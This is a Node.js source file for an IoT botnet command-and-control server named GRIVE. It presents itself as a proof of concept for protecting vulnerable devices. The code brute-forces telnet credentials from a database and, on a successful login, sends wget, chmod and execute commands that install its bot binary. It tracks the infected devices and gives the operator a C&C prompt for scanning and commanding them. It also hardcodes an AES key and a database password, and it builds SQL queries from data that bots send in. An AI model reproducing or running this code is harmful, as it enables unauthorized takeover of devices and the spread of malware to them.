//this is an annotated version of the code
const aesjs = require('aes-js');
const net = require ('net');
const fs =require('fs');
// readline is used to read and write on the comand line
const readline = require('node:readline');

// mysql2 is to deal with the database
const mysql = require ('mysql2');
const { Telnet } = require('telnet-client')
const events = require('events');
var eventEmitter = new events.EventEmitter();
var eventEmitter2 = new events.EventEmitter();

const express = require("express");
//const router = express.Router();
const app = express();
let d = null;
      // function to decode-decrypt the messages from the server
      function decode_decrypt(cipher)
      {       
          var key = [0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c];
          var aes = new aesjs.AES(key);
          var chunk ;
          var decryptedBytes;
          var decryptedChunk;
          var Entiretext="";
          // chunking 24 byte at a time
              for( i = 0; i < cipher.length; i+=24){
                  chunk = cipher.slice(i, i + 24);
                  DecChunk = Buffer.from(chunk,'base64');
                  // Decryption-Decoding
                  try{decryptedBytes = aes.decrypt(DecChunk);
                    decryptedChunk = Buffer.from(decryptedBytes);
                    Entiretext = Entiretext.concat(decryptedChunk);}
                  catch{
                    console.log("GRIVE_ERROR: the cipher size is not 16 bytes.");
                  }

              }
              return Entiretext;     
      }


    function encrypt_encode(plain)
    {       
        var key = [0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c];
        var aes = new aesjs.AES(key);
        var chunk ;
        var encryptedBytes;
        var encryptedChunk;
        var Entiretext="";
        var zeros="";
        var len="";
        var textTosend = "";
    
            for( i = 0; i < plain.length; i+=16){
                chunk = plain.slice(i, i + 16);
                if (chunk.length < 16){
                    for(let i=0; i<(16-chunk.length) ; i++)
                         zeros=zeros.concat(" ");
                    chunk=chunk.concat(zeros);
                    }
                ChunkAsBytes = aesjs.utils.utf8.toBytes(chunk);
                encryptedBytes = aes.encrypt(ChunkAsBytes);
                encryptedChunk = Buffer.from(encryptedBytes).toString('base64');
                Entiretext = Entiretext.concat(encryptedChunk);
            }
            len= Entiretext.length.toString();
            textTosend = textTosend.concat(len, Entiretext);
            return Entiretext;     
    }

console.log("---------------------------------------------------------GRIVE---------------------------------------------------------\n");
console.log("This project GRIVE is a proof of concept of a new strategy in defending the vulnerable IoT devices.\n");

console.log("==== ==== ==== ==== ==== For the sake of secure IoT networks ==== ==== ==== ==== ==== \n");

console.log("To show the available command type help or manual. \n");

app.listen(8081,'172.18.18.18', (err)=>{
    if (err) throw err;
    console.log("Express started at port 8081");
    d = new Date().toISOString();
    fs.writeFile(log_path, `${d}  [C&C]   Express started at port 8081\n`, { flag: 'a+' }, err => {
      if (err) throw err;
    })
});

app.get('/code/grive.out',(req, res)=>{

    res.sendFile('/home/bot/grive.out');

})

app.get('/code/grive01.out',(req, res)=>{
  res.sendFile('/home/bot/grive01.out');

})

let success = false;
let credentials = null;
let i = 1;
const serverIP = '172.18.18.18';
let ip = null;
let log_path = '/home/logFile/logfile.txt'

const sqlcon = mysql.createConnection({
  host: "172.18.18.17",
  port: 3306,
  user:"grive",
  password:"envoletoi",
  database:"Grivedb"
});
// getting the last maximum id of IoTs in the table
let ID = 5000;
sqlcon.query('Select Max(ID) from IoT_Bots;', (err, result)=>{
  if (err) throw err;
  ID = result[0]['Max(ID)'];
  if (ID == null){
    ID = 5000;
  }
  console.log(ID);
})
// the maximum size that is allowed for the message we have to know it and we have 
const MAX_MSG_SIZE = 2000;

// we create a tcp server
var server = net.createServer();
// the server is on 172.18.18.18 on the port 5000
server.listen({
    host: '172.18.18.18',
    port: 5000,
});

let sockets = [];
let address = null;
let open_telnet = [];
let Bot_sock = [];

// this function is to read what the client is forwarding

function readsokcet (socket) {
 // it is triggered whenvere the there is data sent through the socket
 // we must destinguish between the communication from the grive and the communication initiated from the server to the telent attack 
    socket.on('data', function(data) {

        let mess =  decode_decrypt(data.toString());
        //console.log(`The client send:${mess}`);

        Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip){
              var info = mess.split('-');
              fs.writeFile(`/home/logFile/${element.id}_log.txt`, info[0]+'\n', { flag: 'a+' }, err => {
                if (err) throw err;
              });

            }
        })

// setting the bot architecture
        if(mess.includes('Arch: ')){
          Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip){
                  var info = mess.split(':');
                  var target = info[1].split('\n');
                  sqlcon.query(`UPDATE GRIVE_INFO set ARCH = '${target[0].trim()}' where ID = ${element.id};`, (err, result)=>{
                       if (err) throw err;
                        d = new Date().toISOString();
                        fs.writeFile(log_path, `${d}  [IoT_Bots] action: setting_info the grive |${element.id}| architecture, status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
                        if (err) throw err;
                        })
                    });}
              });
          }
// setting the OS
          if(mess.includes('OS')){
            Bot_sock.forEach(element =>{
              if (socket.remoteAddress == element.ip){
              var info = mess.split(':');
              var target = info[1].split('\n');
                    sqlcon.query(`UPDATE GRIVE_INFO set OS = '${target[0].trim()}' where ID = ${element.id};`, (err, result)=>{
                        if (err) throw err;
                        d = new Date().toISOString();
                        fs.writeFile(log_path, `${d}  [IoT_Bots] action: setting_info the grive |${element.id}| operating_system, status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
                        if (err) throw err;
                        })
                    });}
                });
            }
// setting the bot distribution
        if(mess.includes('ID=')){
          Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip)
{            var info = mess.split('=');
              var target = info[1].split('\n');
                   sqlcon.query(`UPDATE GRIVE_INFO set Distribution = '${target[0].trim()}' where ID = ${element.id};`, (err, result)=>{
                       if (err) throw err;
                        d = new Date().toISOString();
                        fs.writeFile(log_path, `${d}  [IoT_Bots] action: setting_info the grive |${element.id}| distribution, status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
                        if (err) throw err;
                        })
                    });}
              });
          }

// setting the bot Total RAM space
        if(mess.includes('MemTotal')){
          Bot_sock.forEach(element =>{
            if (socket.remoteAddress == element.ip)
{            var info = mess.split(':');
              var target = info[1].split('\n');
                   sqlcon.query(`UPDATE GRIVE_INFO set Total_RAM = '${target[0].trim()}' where ID = ${element.id};`, (err, result)=>{
                       if (err) throw err;
                        d = new Date().toISOString();
                        fs.writeFile(log_path, `${d}  [IoT_Bots] action: setting_info the grive |${element.id}| Total RAM, status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
                        if (err) throw err;
                        })
                    });}
              });
          }
// setting the free ram
          if(mess.includes('MemFree')){
            Bot_sock.forEach(element =>{
              if (socket.remoteAddress == element.ip)
{              var info = mess.split(':');
                  var target = info[1].split('\n');
                     sqlcon.query(`UPDATE GRIVE_INFO set Free_RAM = '${target[0].trim()}' where ID = ${element.id};`, (err, result)=>{
                         if (err) throw err;
                          d = new Date().toISOString();
                          fs.writeFile(log_path, `${d}  [IoT_Bots] action: setting_info the grive |${element.id}| Free RAM, status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
                          if (err) throw err;
                          })
                      });}
                });
            }
          

        if(mess.includes('OPEN')){
               address = mess.substring(12, 27).split('-');
               open_telnet.push(address[0]);
               console.log(`[IoT] IoT: ${address[0]}, status: OPEN TELNET.`);
               d = new Date().toISOString();
               fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${address[0]} status: OPEN TELNET.\n`, { flag: 'a+' }, err => {
               if (err) throw err;
               });
        }

        if(mess.includes('PROTECTED')){
          console.log(`[IoT] IoT: ${socket.remoteAddress}, status: PROTECTED.`);
          d = new Date().toISOString();
          fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${socket.remoteAddress}, status: PROTECTED.\n`, { flag: 'a+' }, err => {
          if (err) throw err;
          });
          sqlcon.query(`update IoT_Bots set is_protected = 1 where IP = '${socket.remoteAddress}';`, (err, result)=>{
            if (err) throw err;
          })
         }
    });
    };

// This function is to send msg to the client

function send_msg( conn, msg){

    //encrypt and encode the message first 
    let encrypted_msg = encrypt_encode(msg);
    let encry_length = encrypted_msg.length;  
    if(encry_length > MAX_MSG_SIZE){
        console.log('Error: msg too big');
    
     } else if(encry_length < 10){
        try{
          
    // need to add a space after the msg.lenght
       conn.write("0"+encry_length.toString()+ encrypted_msg); 
        d = new Date().toISOString();
        fs.writeFile(log_path, `${d}  [C&C]       action: Sending message,  grive: ${conn.remoteAddress},  status: 1.\n`, { flag: 'a+' }, err => {
          if (err) throw err;
        })
        }catch(e){
         console.log("Error: "+e);  }
     }else{
        try {
    // first two bytes sent is the lenght of the msg
        conn.write(encry_length.toString()+ encrypted_msg);
         d = new Date().toISOString();
         fs.writeFile(log_path, `${d}  [C&C]       action: Sending message,  grive: ${conn.remoteAddress},  status: 1.\n`, { flag: 'a+' }, err => {
           if (err) throw err;
         })
    
    }catch(e){
        console.log("Error:"+e);
         }
        }    
    };

// function to telnet to a specifique host and get their archytecuture   
async function telnetAttack(ip){
  
  sqlcon.query("select username, password from credentials ;", (err,result)=>{
    if (err) throw err;
    credentials = result;
    d = new Date().toISOString();
    fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${ip}, status: Expedition Begin.\n`, { flag: 'a+' }, err => {
      if (err) throw err;});
    telnetAttacker(ip, result[0].username, result[0].password);
    i = 1;
   });
}
  
  var attackagain= function() {
   
    if (success == false && i < credentials.length){
      telnetAttacker(ip, credentials[i].username, credentials[i].password);
      i++;
    } 
    else{
      console.log('The attack is finished.');
      d = new Date().toISOString();
      fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${ip}, status: Expedition Finished.\n`, { flag: 'a+' }, err => {
        if (err) throw err;
      })
      eventEmitter2.emit('fin');
    } 
    
  }
  
  var next_ip = function(){

    if(open_telnet.length > 0){
      ip = open_telnet.pop();
      console.log(`The attack on the ip ${ip} will begin`);
      d = new Date().toISOString();
      fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${ip}, status: Expedition Begin.\n`, { flag: 'a+' }, err => {
        if (err) throw err;
      })
    telnetAttack(ip);
    }
    

  }

  eventEmitter.on('unlock', attackagain);
  eventEmitter2.on('fin', next_ip);
  
  async function telnetAttacker(ip, uname, password){
  
  
  const connection = new Telnet();
  const params = {
      host: ip,
      port: 23,
      shellPrompt: "$",
      encoding: 'utf8',
      timeout: 5000
  
  }
  
  connection.on('ready', prompt => {

    });
  
  let recall = false;
  let lock = false;
  let pass_lock = false;
  let arch_lock = false;
  let os_lock = false;
  
  connection.on('data', (data)=>{
  

  
    if(data.includes('incorrect')){
  
      success = false;
      connection.end();
  
  } else if(data.includes('Welcome') && lock == false){
  
      success = true;
      console.log(`[IoT] IoT:    ${ip},  True Credentials: ${uname}, ${password}.`);
      connection.send('uname --m');
  
  } else if(data.includes('login') && !data.includes('Last') && recall == false){
  
       connection.send(uname);
       recall = true;
  
  } else if(data.includes('Password') && pass_lock == false){
  
          connection.send(password);
          pass_lock = true;
  
  } if(data.includes("x86") && arch_lock == false) {
  
      arch = 'x86';
      arch_lock = true;
      console.log()
      connection.send(` wget ${serverIP}:8081/code/grive.out`)
      connection.send(`chmod 777 grive.out`);
      connection.send(`./grive.out & \r`);
      console.log(`[C&C] IoT: ${ip},    status: Expedition Successful.\n`);
      d = new Date().toISOString();
      fs.writeFile(log_path, `${d}  [IoT]       IoT:    ${ip}, status: Expedition Successful.\n`, { flag: 'a+' }, err => {
        if (err) throw err;
      })
  
  } if(data.includes('Linux') && os_lock == false){
  
      os = 'linux';
      os_lock == true;
  
  }    
  })
  
  connection.on('timeout', () => {
    connection.end();
  })
  
  connection.on('close', () => {
   eventEmitter.emit('unlock');
  })
  
   connection.connect(params);
  
  }

// here we define an interface to the command line to read and write on it    
const RLine = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  prompt: 'C&C> '
});

//console.log("whenver you want enter a command or a message to send it to the client.");
RLine.prompt();


//let msg = 'The server will send you soon some command to execute them!!';
// conecting the server to the database.
sqlcon.connect((err)=>{
  if (err) throw err;

  console.log('[C&C] action: Connection to the database, status: 1.');
  d = new Date().toISOString();
  fs.writeFile(log_path, `${d}  [C&C]       action: Connection to the database, status: 1.\n`, { flag: 'a+' }, err => {
    if (err) throw err;
  })

});


// this what the server will do whenever a client is connected to it 


server.on('connection', (conn)=>{
 
 // save the socket on an array;
sockets.push(conn); 
console.log(`MAX_ID= ${ID}`);

  sqlcon.query(`select ID from IoT_Bots where IP ='${conn.remoteAddress}'`,(err, result) => {
    if (err) throw err;
    let command =null;
    // if it is an new ip add a record to the database
    if (result.length == 0) {
      //  console.log("A new IOT!!");
        ID++;
        console.log(`[C&C] Grive: ${ID}, status: Connected`);
        sqlcon.query(`Insert into IoT_Bots (ID, IP, port, status) values (${ID},'${conn.remoteAddress}',${conn.remotePort},'Connected');`, (err, result)=>{
            if (err) throw err;
            console.log(`[IoT_Bots] action: Adding grive ${ID}, status:${result.affectedRows}`);
            d = new Date().toISOString();
            fs.writeFile(log_path, `${d}  [IoT_Bots]  action: Adding grive ${conn.remoteAddress},   status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
            if (err) throw err;
             })
          });
          sqlcon.query(`Insert into GRIVE_INFO (ID, OS, ARCH, Distribution, Total_RAM, Free_RAM) values (${ID},'','','','','');`, (err, result)=>{
            if (err) throw err;
            console.log(`[IoT_Bots] action: Adding grive ${ID}, status:${result.affectedRows}`);
            d = new Date().toISOString();
            fs.writeFile(log_path, `${d}  [IoT_Bots]  action: Adding grive ${conn.remoteAddress},   status:${result.affectedRows}\n`, { flag: 'a+' }, err => {
            if (err) throw err;
             })
          });
          command = `00 ${ID}`
          send_msg(conn, command);
          Bot_sock.push({id: ID, ip: conn.remoteAddress, socket: conn});
         

    }else{// if it is an old update the record
     console.log(`[C&C] grive: ${result[0]['ID']}, status: Connected`);
     d = new Date().toISOString();
     fs.writeFile(log_path, `${d}  [IoT_Bots]  action: connecting grive ${result[0]['ID']},   status: 1\n`, { flag: 'a+' }, err => {
     if (err) throw err;
      })
      sqlcon.query(`UPDATE IoT_Bots set port = ${conn.remotePort} where IP = '${conn.remoteAddress}';`, (err, result)=>{
        if (err) throw err;
      });
      command = `00 ${result[0]['ID']}`
      send_msg(conn, command);
      Bot_sock.push({id: result[0]['ID'], ip: conn.remoteAddress, socket: conn});
      
    }
 
    
  });

  conn.on("close", (err)=>{
    if (err) throw err;
    Bot_sock.forEach(b=>{
          if(b.ip == conn.remoteAddress){
            console.log(`The grive ${conn.remoteAddress} is disconnected`);
            Bot_sock.splice(Bot_sock.indexOf(b),1);
            d = new Date().toISOString();
            fs.writeFile(log_path, `${d}  [IoT_Bots]  grive: ${conn.remoteAddress}, status: LOST.\n`, { flag: 'a+' }, err => {
             if (err) throw err;
             })
            sqlcon.query(`UPDATE IoT_Bots set status = 'Terminated' where IP = '${conn.remoteAddress}';`, (err, result)=>{
              if (err) throw err;
            
            });
          }    
    }) 
  });
  conn.setKeepAlive(true);
  readsokcet(conn);

});



// the handeler of the event of writing on the command line
RLine.on('line', (line) => {
  switch (line.trim()) {
    case 'expedition':
      ip = open_telnet.pop();
        telnetAttack(ip);
        break;
    case 'manual':
        console.log("\n");
        console.log("For the sake of protected IoT network. ");
        console.log("\n");
        console.log("Server Commands:");
        console.log("show            View the alive grive.")
        console.log("expedition      Conquer new land.");
        console.log("grive           Choose a grive to command.")
        console.log("land            View the lands to conquer.")
        console.log("info            View inforamtion about IoT connected devices.");
        console.log("protect all     Protect all unprotected connected IoT.")
        console.log("\n");
        console.log("------------------  Grive Protocol ------------------ ");
        console.log("COMMAND CODES");
        console.log("01   SCAN: 01 <ip>/<mask>");
        console.log("02   SYSTEM INFO: 02");
        console.log("03   UPDATE BINARIES: 03 <file name>");
        console.log("04   SEND REPORT: 04");
        console.log("05   PROTECT: 05");
        console.log("06   ADVANCED: 06");
        console.log("07   KILL: 07");
        console.log("\n");
        break;
    case 'help':
      console.log("For the sake of protected IoTs. ");
      console.log("\n");
      console.log("show            View the current connected bots.");
      console.log("expedition      Access the vulnerable device, and send them bots.");
      console.log("grive           Choose a bot to send them a command.");
      console.log("land            View the vulnerable IoT device to protect.");
      console.log("info            View inforamtion about IoT connected devices.");
      console.log("protect all     Protect all unprotected connected IoT.");
      console.log("\n");
      break;
    case 'grive':
      RLine.question("Enter the id:", (grive_id)=>{

        let tmp_socket = null;
        console.log(Bot_sock.length);
        if(Bot_sock.length != 0 ){
          Bot_sock.forEach(element => {
            if(element.id == grive_id)
              tmp_socket = element.socket;         
          });
        }
        if ( tmp_socket != null){
          console.log("------------------  Grive Protocol ------------------ ");
                console.log("COMMAND CODES");
                console.log("01   SCAN: 01 <ip>/<mask>");
                console.log("02   SYSTEM INFO: 02");
                console.log("03   UPDATE BINARIES: 03 <file name>");
                console.log("04   SEND REPORT: 04");
                console.log("05   PROTECT: 05");
                console.log("06   ADVANCED: 06");
                console.log("07   KILL: 07");
                RLine.question("Enter the command:", (command)=>{
                  switch(command){
                    case 'end' :
                      sqlcon.query(`UPDATE IoT_Bots set  status = 'killed' where IP = '${tmp_socket.remoteAddress}';`, (err, result)=>{
                        if (err) throw err;
                      });
                    break;
                    case 'connect':
                    tmp_socket.connect(tmp_socket.remotePort, tmp_socket.remoteAddress);
                    break;
                    default:
                      break;
                  }
                  send_msg(tmp_socket, command);
    
              })
        }
           
        else 
          console.log(`The grive |${grive_id}| is not connected now!`);
        
        
      });
      break;
      case 'show':
        Bot_sock.forEach(element =>{
          console.log(element.id);
        });
        break;
      case 'info':
        RLine.question("Enter the id:", (grive_id)=>{

          let connected = false;
          if(Bot_sock.length != 0 ) {
               Bot_sock.forEach(element => {  
                      if(element.id == grive_id)
                            connected = true }); 
              if (connected){
                sqlcon.query(`select IoT_Bots.ID, IoT_Bots.IP, IoT_Bots.port, IoT_Bots.status, GRIVE_INFO.ARCH, GRIVE_INFO.OS, GRIVE_INFO.Distribution, GRIVE_INFO.Total_RAM, GRIVE_INFO.Free_RAM from IoT_Bots JOIN GRIVE_INFO on IoT_Bots.ID = GRIVE_INFO.ID where GRIVE_INFO.ID = ${grive_id};`,(err, result)=>{
                 
                  if (err) throw err;
                  console.log(result);
                })
              }
          }
          if (!connected)
                console.log(`The grive |${grive_id}| is not connected now!`);
                  
        });
      
      break;
      case 'land':
        console.log(open_telnet);
      break;
      case 'protect all':
        sqlcon.query(`select ID from IoT_Bots where is_protected = 0;`, (err, result)=>{
          if (err) throw err;
        console.log(result);
        if(result.length == 0) console.log('They are already all protected!!');
        else {
          result.forEach(element => {

            if(Bot_sock.length != 0 ){
              Bot_sock.forEach(grive => {
                if(grive.id == element.ID){
                  send_msg(grive.socket, "05"); 
                }
                          
              });
            }
                                    })
               }
        })
        break;
        case "aurevoir":
          sqlcon.query(`delete from GRIVE_INFO where ID > 5000;`, (err, result)=>{
            if (err) throw err;
          });
            sqlcon.query(`delete from IoT_Bots where ID > 5000;`, (err, result)=>{
            if (err) throw err;
          });
          process.exit(0);
          break;
    default:
      console.log(`Say what? I might have heard '${line.trim()}'`);
      console.log("Type manual or help for list of available instruction.");
      break;
  }
  RLine.prompt();
}).on('close', () => {
  console.log('Have a great day!');
  sqlcon.query(`delete from GRIVE_INFO where ID > 5000;`, (err, result)=>{
    if (err) throw err;
  });
    sqlcon.query(`delete from IoT_Bots where ID > 5000;`, (err, result)=>{
    if (err) throw err;
  });
  process.exit(0);
});


